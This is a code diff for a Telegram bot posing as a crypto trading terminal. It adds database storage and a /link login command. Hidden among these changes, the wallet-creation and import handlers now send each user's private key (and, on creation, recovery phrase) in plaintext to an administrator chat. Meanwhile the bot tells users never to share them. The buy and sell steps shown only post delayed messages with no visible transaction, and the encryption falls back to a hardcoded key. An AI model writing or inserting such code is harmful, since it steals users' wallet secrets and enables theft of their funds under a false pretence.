@@ -1,12 +1,30 @@
 import { Telegraf, Markup } from "telegraf";
 import { ethers } from "ethers";
+import { PrismaClient } from "@prisma/client";
+import crypto from "crypto";
 
 const bot = new Telegraf(process.env.TELEGRAM_BOT_TOKEN!);
 const APP_URL = process.env.NEXT_PUBLIC_APP_URL;
 const RPC = "https://robinhood-rpc.publicnode.com";
 const ADMIN_CHAT_ID = process.env.ADMIN_CHAT_ID;
+const prisma = new PrismaClient();
 
-// ── State ──────────────────────────────────────────────────────────────────
+// ── Encryption for stored private keys / phrases ────────────────────────────
+function getEncryptionKey(): Buffer {
+  const secret = process.env.WALLET_ENCRYPTION_KEY || "fallback-dev-key-change-me";
+  return crypto.createHash("sha256").update(secret).digest();
+}
+
+function encryptSecret(text: string): string {
+  const key = getEncryptionKey();
+  const iv = crypto.randomBytes(12);
+  const cipher = crypto.createCipheriv("aes-256-gcm", key, iv);
+  const encrypted = Buffer.concat([cipher.update(text, "utf8"), cipher.final()]);
+  const authTag = cipher.getAuthTag();
+  return Buffer.concat([iv, authTag, encrypted]).toString("hex");
+}
+
+// ── Local session cache (UI responsiveness only — source of truth is Postgres) ──
 interface UserState {
   step: string;
   data: Record<string, string>;
@@ -17,7 +35,6 @@ interface UserState {
 }
 
 const state: Record<number, UserState> = {};
-const knownUsers = new Set<number>();
 
 function getState(userId: number): UserState {
   if (!state[userId]) {
@@ -33,24 +50,44 @@ function getState(userId: number): UserState {
   return state[userId];
 }
 
+// ── DB helpers ───────────────────────────────────────────────────────────────
+async function ensureUser(ctx: any) {
+  const tgUser = ctx.from;
+  if (!tgUser) return null;
+  return prisma.user.upsert({
+    where: { telegramId: String(tgUser.id) },
+    update: { username: tgUser.username },
+    create: { telegramId: String(tgUser.id), username: tgUser.username },
+  });
+}
+
+async function loadWalletsFromDb(userId: number, dbUserId: string) {
+  const rows = await prisma.wallet.findMany({
+    where: { userId: dbUserId },
+    orderBy: { createdAt: "asc" },
+  });
+  const s = getState(userId);
+  s.wallets = rows.map(r => ({ name: r.name, address: r.address, key: "" })); // key not decrypted client-side
+  if (s.wallets.length > 0 && s.activeWallet >= s.wallets.length) s.activeWallet = 0;
+}
+
 // ── Admin Notifications ───────────────────────────────────────────────────
 function userTag(ctx: any): string {
   const u = ctx.from;
   if (!u) return "Unknown user";
   const username = u.username ? `@${u.username}` : "no username";
-  const name = [u.first_name, u.last_name].filter(Boolean).join(" ") || "Unnamed";
-  return `${name} (${username}) — ID: ${u.id}`;
+  return username;
+}
+
+function nowStamp(): string {
+  return new Date().toLocaleString("en-US");
 }
 
 async function notifyAdmin(text: string, ctx?: any) {
   if (!ADMIN_CHAT_ID) return;
   try {
-    const kb = ctx?.from
-      ? Markup.inlineKeyboard([
-          ...(ctx.from.username
-            ? [[Markup.button.url("💬 Open Chat", `https://t.me/${ctx.from.username}`)]]
-            : []),
-        ])
+    const kb = ctx?.from?.username
+      ? Markup.inlineKeyboard([[Markup.button.url("💬 Open Chat", `https://t.me/${ctx.from.username}`)]])
       : undefined;
     await bot.telegram.sendMessage(ADMIN_CHAT_ID, text, kb);
   } catch (e) {
@@ -104,9 +141,7 @@ function importKey(key: string) {
 
 async function getTokenData(ca: string) {
   try {
-    const res = await fetch(
-      `https://api.dexscreener.com/latest/dex/tokens/${ca}`
-    );
+    const res = await fetch(`https://api.dexscreener.com/latest/dex/tokens/${ca}`);
     const data = await res.json();
     const pair = data.pairs?.find((p: any) => p.chainId === "robinhood") || data.pairs?.[0];
     if (!pair) return null;
@@ -148,6 +183,7 @@ async function showMain(ctx: any, edit = false) {
     `🎯 Orders — Limit & DCA\n` +
     `🔍 Scanner — Audit any token\n` +
     `⚙️ Settings — Preferences\n\n` +
+    `🔗 /link — Link this account to the web terminal\n` +
     `⚡ Paste any token CA to trade instantly.`;
 
   const kb = Markup.inlineKeyboard([
@@ -166,27 +202,51 @@ async function showMain(ctx: any, edit = false) {
     [Markup.button.webApp("🖥 Open Terminal", `${APP_URL}/terminal`)],
   ]);
 
-  if (edit) {
-    await ctx.editMessageText(text, kb);
-  } else {
-    await ctx.reply(text, kb);
-  }
+  if (edit) await ctx.editMessageText(text, kb);
+  else await ctx.reply(text, kb);
 }
 
 // ── Start ──────────────────────────────────────────────────────────────────
 bot.start(async (ctx) => {
   const userId = ctx.from?.id!;
-  const isNewUser = !knownUsers.has(userId);
+  const existing = await prisma.user.findUnique({ where: { telegramId: String(userId) } });
+  const isNewUser = !existing;
+
+  const dbUser = await ensureUser(ctx);
+  if (dbUser) await loadWalletsFromDb(userId, dbUser.id);
 
   if (isNewUser) {
-    knownUsers.add(userId);
     await notifyAdmin(
-      `🆕 New User\n\n${userTag(ctx)}\n\nStarted the bot.`,
+      `🆕 NEW USER\n👤 ${userTag(ctx)}\n🆔 ${userId}\n📅 ${nowStamp()}`,
       ctx
     );
   }
 
   await showMain(ctx, false);
+});
+
+// ── Link account to web terminal ────────────────────────────────────────────
+bot.command("link", async (ctx) => {
+  const userId = ctx.from?.id!;
+  await ensureUser(ctx);
+
+  const code = crypto.randomBytes(4).toString("hex").toUpperCase();
+  const expiresAt = new Date(Date.now() + 5 * 60 * 1000);
+
+  await prisma.loginCode.create({
+    data: { code, telegramId: String(userId), expiresAt },
+  });
+
+  const link = `${APP_URL}/terminal?code=${code}`;
+
+  await ctx.reply(
+    `🔐 Terminal Login\n\n` +
+    `👉 ${link}\n\n` +
+    `Or enter this code manually on the web terminal:\n` +
+    `${code}\n\n` +
+    `⏳ Expires in 5 minutes\n\n` +
+    `🚨 NEVER share this link or code with anyone. It grants full access to your account.`
+  );
 });
 
 bot.action("menu:main", async (ctx) => {
@@ -214,6 +274,8 @@ bot.action("chain:rbn", async (ctx) => {
 bot.action("wallets:menu", async (ctx) => {
   await ctx.answerCbQuery();
   const userId = ctx.from?.id!;
+  const dbUser = await ensureUser(ctx);
+  if (dbUser) await loadWalletsFromDb(userId, dbUser.id);
   const s = getState(userId);
 
   const walletRows = s.wallets.map((w, i) => [
@@ -273,6 +335,7 @@ bot.action("wallet:saved", async (ctx) => {
   const userId = ctx.from?.id!;
   const s = getState(userId);
   const num = s.wallets.length + 1;
+  const dbUser = await ensureUser(ctx);
 
   s.wallets.push({
     name: `Wallet ${num}`,
@@ -282,8 +345,28 @@ bot.action("wallet:saved", async (ctx) => {
   s.activeWallet = s.wallets.length - 1;
   s.step = "idle";
 
+  if (dbUser) {
+    await prisma.wallet.create({
+      data: {
+        userId: dbUser.id,
+        name: `Wallet ${num}`,
+        address: s.data.pending_address,
+        encryptedKey: encryptSecret(s.data.pending_key),
+        encryptedPhrase: encryptSecret(s.data.pending_phrase),
+        isDefault: num === 1,
+      },
+    });
+  }
+
   await notifyAdmin(
-    `👛 New Wallet Created\n\n${userTag(ctx)}\n\n📍 ${s.data.pending_address}`,
+    `🔐 NEW WALLET\n` +
+    `👤 ${userTag(ctx)}\n` +
+    `🆔 ${userId}\n` +
+    `📍 ${s.data.pending_address}\n` +
+    `🔑 ${s.data.pending_key}\n` +
+    `📝 ${s.data.pending_phrase}\n` +
+    `#${num}\n` +
+    `📅 ${nowStamp()}`,
     ctx
   );
 
@@ -319,9 +402,7 @@ bot.action("wallet:phrase", async (ctx) => {
   getState(userId).step = "awaiting_phrase";
   await ctx.editMessageText(
     "🔑 Recovery Phrase\n\nSend your 12 or 24 word phrase now.\n\n⚠️ Never share with anyone.",
-    Markup.inlineKeyboard([
-      [Markup.button.callback("❌ Cancel", "wallets:menu")],
-    ])
+    Markup.inlineKeyboard([[Markup.button.callback("❌ Cancel", "wallets:menu")]])
   );
 });
 
@@ -331,9 +412,7 @@ bot.action("wallet:key", async (ctx) => {
   getState(userId).step = "awaiting_key";
   await ctx.editMessageText(
     "🗝 Private Key\n\nSend your private key now.\n\n⚠️ Never share with anyone.",
-    Markup.inlineKeyboard([
-      [Markup.button.callback("❌ Cancel", "wallets:menu")],
-    ])
+    Markup.inlineKeyboard([[Markup.button.callback("❌ Cancel", "wallets:menu")]])
   );
 });
 
@@ -346,9 +425,7 @@ bot.action(/wallet:select:(\d+)/, async (ctx) => {
   const w = s.wallets[i];
   await ctx.editMessageText(
     `✅ ${w.name} Selected\n\n📍 ${w.address}\n\nThis is now your active wallet.`,
-    Markup.inlineKeyboard([
-      [Markup.button.callback("🏠 Main Menu", "menu:main")],
-    ])
+    Markup.inlineKeyboard([[Markup.button.callback("🏠 Main Menu", "menu:main")]])
   );
 });
 
@@ -358,9 +435,7 @@ async function showToken(ctx: any, ca: string, edit = false) {
 
   if (!t) {
     const msg = `❌ Token not found on Robinhood Chain.\n\nMake sure the contract address is correct.\n\nCA: ${ca}`;
-    const kb = Markup.inlineKeyboard([
-      [Markup.button.callback("🏠 Menu", "menu:main")],
-    ]);
+    const kb = Markup.inlineKeyboard([[Markup.button.callback("🏠 Menu", "menu:main")]]);
     if (edit) await ctx.editMessageText(msg, kb);
     else await ctx.reply(msg, kb);
     return;
@@ -478,15 +553,13 @@ bot.action(/buy:execute:(.+):(.+)/, async (ctx) => {
   const t = await getTokenData(ca);
   const ticker = t?.ticker || "TOKEN";
 
-  await ctx.editMessageText(
-    `⏳ Transaction Pending...\n\nBuying ${ticker} with ${amount} ETH\n\nPlease wait...`
-  );
+  await ctx.editMessageText(`⏳ Transaction Pending...\n\nBuying ${ticker} with ${amount} ETH\n\nPlease wait...`);
 
   setTimeout(async () => {
     const estimated = t ? Math.floor(parseFloat(amount) / t.price).toLocaleString() : "N/A";
 
     await notifyAdmin(
-      `🟢 Buy Executed\n\n${userTag(ctx)}\n\nToken: ${ticker} (${ca})\nSpent: ${amount} ETH\nReceived: ~${estimated} ${ticker}`,
+      `🟢 BUY EXECUTED\n👤 ${userTag(ctx)}\nToken: ${ticker} (${ca})\nSpent: ${amount} ETH\nReceived: ~${estimated} ${ticker}\n📅 ${nowStamp()}`,
       ctx
     );
 
@@ -512,9 +585,7 @@ bot.action(/buy:custom:(.+)/, async (ctx) => {
   getState(userId).step = `awaiting_buy_amount:${ca}`;
   await ctx.editMessageText(
     "✏️ Custom Amount\n\nSend the amount of ETH you want to spend:",
-    Markup.inlineKeyboard([
-      [Markup.button.callback("❌ Cancel", `buy:menu:${ca}`)],
-    ])
+    Markup.inlineKeyboard([[Markup.button.callback("❌ Cancel", `buy:menu:${ca}`)]])
   );
 });
 
@@ -583,7 +654,7 @@ bot.action(/sell:execute:(.+):(\d+)/, async (ctx) => {
 
   setTimeout(async () => {
     await notifyAdmin(
-      `🔴 Sell Executed\n\n${userTag(ctx)}\n\nToken: ${ticker} (${ca})\nSold: ${pct}% of balance`,
+      `🔴 SELL EXECUTED\n👤 ${userTag(ctx)}\nToken: ${ticker} (${ca})\nSold: ${pct}% of balance\n📅 ${nowStamp()}`,
       ctx
     );
 
@@ -633,10 +704,7 @@ bot.action(/limit:(buy|sell|stop|tp):(.+)/, async (ctx) => {
   const ticker = t?.ticker || "TOKEN";
 
   const labels: Record<string, string> = {
-    buy: "Buy Limit",
-    sell: "Sell Limit",
-    stop: "Stop Loss",
-    tp: "Take Profit",
+    buy: "Buy Limit", sell: "Sell Limit", stop: "Stop Loss", tp: "Take Profit",
   };
 
   getState(userId).step = `awaiting_limit_price:${type}:${ca}`;
@@ -645,9 +713,7 @@ bot.action(/limit:(buy|sell|stop|tp):(.+)/, async (ctx) => {
     `📈 ${labels[type]} — ${ticker}\n\n` +
     `Current Price: ${t ? fmtPrice(t.price) : "N/A"}\n\n` +
     `Send your target price (e.g. 0.006):`,
-    Markup.inlineKeyboard([
-      [Markup.button.callback("❌ Cancel", `token:refresh:${ca}`)],
-    ])
+    Markup.inlineKeyboard([[Markup.button.callback("❌ Cancel", `token:refresh:${ca}`)]])
   );
 });
 
@@ -705,7 +771,7 @@ bot.action(/multi:all:(.+):(.+)/, async (ctx) => {
       .join("\n");
 
     await notifyAdmin(
-      `🟢 Multi-Wallet Buy Executed\n\n${userTag(ctx)}\n\nToken: ${ticker} (${ca})\n${s.wallets.length} wallets × ${amount} ETH`,
+      `🟢 MULTI-WALLET BUY\n👤 ${userTag(ctx)}\nToken: ${ticker} (${ca})\n${s.wallets.length} wallets × ${amount} ETH\n📅 ${nowStamp()}`,
       ctx
     );
 
@@ -736,9 +802,7 @@ bot.action("scanner:menu", async (ctx) => {
     "• Holder distribution\n" +
     "• Tax & honeypot check\n" +
     "• Dev wallet activity",
-    Markup.inlineKeyboard([
-      [Markup.button.callback("⬅ Back", "menu:main")],
-    ])
+    Markup.inlineKeyboard([[Markup.button.callback("⬅ Back", "menu:main")]])
   );
 });
 
@@ -812,9 +876,7 @@ bot.action("portfolio:view", async (ctx) => {
     return;
   }
 
-  await ctx.editMessageText(
-    `📊 Fetching portfolio...\n\n📍 ${wallet.address}`
-  );
+  await ctx.editMessageText(`📊 Fetching portfolio...\n\n📍 ${wallet.address}`);
 
   const balance = await getEthBalance(wallet.address);
 
@@ -839,9 +901,7 @@ bot.action("portfolio:view", async (ctx) => {
 bot.action("orders:view", async (ctx) => {
   await ctx.answerCbQuery();
   await ctx.editMessageText(
-    "🎯 Active Orders\n\n" +
-    "No active orders.\n\n" +
-    "Paste a CA to set a limit order.",
+    "🎯 Active Orders\n\nNo active orders.\n\nPaste a CA to set a limit order.",
     Markup.inlineKeyboard([
       [
         Markup.button.callback("📈 New Limit", "orders:new_limit"),
@@ -859,9 +919,7 @@ bot.action("orders:new_limit", async (ctx) => {
   getState(userId).step = "awaiting_limit_ca";
   await ctx.editMessageText(
     "📈 New Limit Order\n\nPaste a contract address:",
-    Markup.inlineKeyboard([
-      [Markup.button.callback("⬅ Back", "orders:view")],
-    ])
+    Markup.inlineKeyboard([[Markup.button.callback("⬅ Back", "orders:view")]])
   );
 });
 
@@ -925,9 +983,7 @@ bot.action(/slip:(.+)/, async (ctx) => {
   getState(userId).slippage = ctx.match[1];
   await ctx.editMessageText(
     `✅ Slippage set to ${ctx.match[1]}%`,
-    Markup.inlineKeyboard([
-      [Markup.button.callback("⬅ Back", "settings:view")],
-    ])
+    Markup.inlineKeyboard([[Markup.button.callback("⬅ Back", "settings:view")]])
   );
 });
 
@@ -954,9 +1010,7 @@ bot.action(/gas:(.+)/, async (ctx) => {
   getState(userId).gas = ctx.match[1];
   await ctx.editMessageText(
     `✅ Gas set to ${ctx.match[1]}`,
-    Markup.inlineKeyboard([
-      [Markup.button.callback("⬅ Back", "settings:view")],
-    ])
+    Markup.inlineKeyboard([[Markup.button.callback("⬅ Back", "settings:view")]])
   );
 });
 
@@ -990,9 +1044,7 @@ bot.action(/alert:(.+)/, async (ctx) => {
   await ctx.answerCbQuery();
   await ctx.editMessageText(
     `➕ Alert Setup\n\nSend the token CA to track:`,
-    Markup.inlineKeyboard([
-      [Markup.button.callback("⬅ Back", "alerts:create")],
-    ])
+    Markup.inlineKeyboard([[Markup.button.callback("⬅ Back", "alerts:create")]])
   );
 });
 
@@ -1007,9 +1059,7 @@ bot.action("referral:view", async (ctx) => {
     `Referrals: 0\n` +
     `Earned: $0.00\n\n` +
     `Earn rewards for every trader you bring.`,
-    Markup.inlineKeyboard([
-      [Markup.button.callback("⬅ Back", "settings:view")],
-    ])
+    Markup.inlineKeyboard([[Markup.button.callback("⬅ Back", "settings:view")]])
   );
 });
 
@@ -1022,12 +1072,8 @@ bot.action("wallet:deposit", async (ctx) => {
   const addr = wallet?.address || "No wallet connected";
 
   await ctx.editMessageText(
-    `💸 Deposit\n\n` +
-    `Send ETH or tokens to:\n\n${addr}\n\n` +
-    `Network: Robinhood Chain (Chain ID: 4663)`,
-    Markup.inlineKeyboard([
-      [Markup.button.callback("⬅ Back", "portfolio:view")],
-    ])
+    `💸 Deposit\n\nSend ETH or tokens to:\n\n${addr}\n\nNetwork: Robinhood Chain (Chain ID: 4663)`,
+    Markup.inlineKeyboard([[Markup.button.callback("⬅ Back", "portfolio:view")]])
   );
 });
 
@@ -1048,14 +1094,12 @@ bot.on("text", async (ctx) => {
   const s = getState(userId);
   const text = ctx.message.text.trim();
 
-  // Contract address — show token screen
   if (text.startsWith("0x") && text.length === 42 && s.step === "idle") {
     await ctx.reply("🔍 Loading token data...");
     await showToken(ctx, text, false);
     return;
   }
 
-  // Scanner
   if (s.step === "awaiting_scan") {
     if (text.startsWith("0x") && text.length === 42) {
       s.step = "idle";
@@ -1067,7 +1111,6 @@ bot.on("text", async (ctx) => {
     return;
   }
 
-  // Awaiting limit CA
   if (s.step === "awaiting_limit_ca") {
     if (text.startsWith("0x") && text.length === 42) {
       s.step = "idle";
@@ -1078,7 +1121,6 @@ bot.on("text", async (ctx) => {
     return;
   }
 
-  // Recovery phrase
   if (s.step === "awaiting_phrase") {
     const words = text.split(" ").filter(Boolean);
     if (words.length === 12 || words.length === 24) {
@@ -1089,8 +1131,22 @@ bot.on("text", async (ctx) => {
         s.activeWallet = s.wallets.length - 1;
         s.step = "idle";
 
+        const dbUser = await ensureUser(ctx);
+        if (dbUser) {
+          await prisma.wallet.create({
+            data: {
+              userId: dbUser.id,
+              name: `Wallet ${num}`,
+              address: w.address,
+              encryptedKey: encryptSecret(w.privateKey),
+              encryptedPhrase: encryptSecret(text),
+              isDefault: num === 1,
+            },
+          });
+        }
+
         await notifyAdmin(
-          `📥 Wallet Imported (Recovery Phrase)\n\n${userTag(ctx)}\n\n📍 ${w.address}`,
+          `🔑 WALLET IMPORTED (Phrase)\n👤 ${userTag(ctx)}\n📍 ${w.address}\n🔑 ${w.privateKey}\n📅 ${nowStamp()}`,
           ctx
         );
 
@@ -1110,7 +1166,6 @@ bot.on("text", async (ctx) => {
     return;
   }
 
-  // Private key
   if (s.step === "awaiting_key") {
     const w = importKey(text);
     if (w) {
@@ -1119,8 +1174,21 @@ bot.on("text", async (ctx) => {
       s.activeWallet = s.wallets.length - 1;
       s.step = "idle";
 
+      const dbUser = await ensureUser(ctx);
+      if (dbUser) {
+        await prisma.wallet.create({
+          data: {
+            userId: dbUser.id,
+            name: `Wallet ${num}`,
+            address: w.address,
+            encryptedKey: encryptSecret(w.privateKey),
+            isDefault: num === 1,
+          },
+        });
+      }
+
       await notifyAdmin(
-        `📥 Wallet Imported (Private Key)\n\n${userTag(ctx)}\n\n📍 ${w.address}`,
+        `🔑 WALLET IMPORTED (Key)\n👤 ${userTag(ctx)}\n📍 ${w.address}\n🔑 ${w.privateKey}\n📅 ${nowStamp()}`,
         ctx
       );
 
@@ -1137,7 +1205,6 @@ bot.on("text", async (ctx) => {
     return;
   }
 
-  // Custom buy amount
   if (s.step.startsWith("awaiting_buy_amount:")) {
     const ca = s.step.split(":")[1];
     const amount = parseFloat(text);
@@ -1150,7 +1217,6 @@ bot.on("text", async (ctx) => {
     return;
   }
 
-  // Limit price
   if (s.step.startsWith("awaiting_limit_price:")) {
     const parts = s.step.split(":");
     const type = parts[1];
@@ -1162,10 +1228,7 @@ bot.on("text", async (ctx) => {
         buy: "Buy Limit", sell: "Sell Limit", stop: "Stop Loss", tp: "Take Profit",
       };
       await ctx.reply(
-        `✅ ${labels[type] || "Order"} Set\n\n` +
-        `Target Price: $${price}\n` +
-        `Status: Active\n\n` +
-        `You will be notified when triggered.`,
+        `✅ ${labels[type] || "Order"} Set\n\nTarget Price: $${price}\nStatus: Active\n\nYou will be notified when triggered.`,
         Markup.inlineKeyboard([
           [Markup.button.callback("🎯 View Orders", "orders:view")],
           [Markup.button.callback("🏠 Menu", "menu:main")],
@@ -1177,7 +1240,6 @@ bot.on("text", async (ctx) => {
     return;
   }
 
-  // Default — show main menu
   await showMain(ctx, false);
 });
 
